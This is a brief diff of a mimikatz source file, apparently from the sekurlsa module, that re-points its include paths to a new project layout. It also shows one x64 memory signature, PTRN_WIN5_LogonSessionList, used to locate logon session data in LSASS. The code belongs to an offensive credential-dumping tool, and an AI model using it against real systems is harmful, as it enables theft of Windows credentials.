@@ -1,11 +1,16 @@
+#include "../../include/mimikatz/inc/globals.h"
+#include "../../include/mimikatz/modules/kull_m_patch.h"
+#include "../../include/mimikatz/sekurlsa/globals_sekurlsa.h"
+#include "../../../core/include/core/winapi_simple.h"
+
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
 	Licence : http://creativecommons.org/licenses/by/3.0/fr/
 */
-#include "winapi.h"
-#include "kuhl_m_sekurlsa_utils.h"
-#include "core\string_crypt.h"
+//#include "winapi.h"
+//#include "kuhl_m_sekurlsa_utils.h"
+//#include "core\string_crypt.h"
 
 #ifdef _M_X64
 BYTE PTRN_WIN5_LogonSessionList[]		= {0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8};
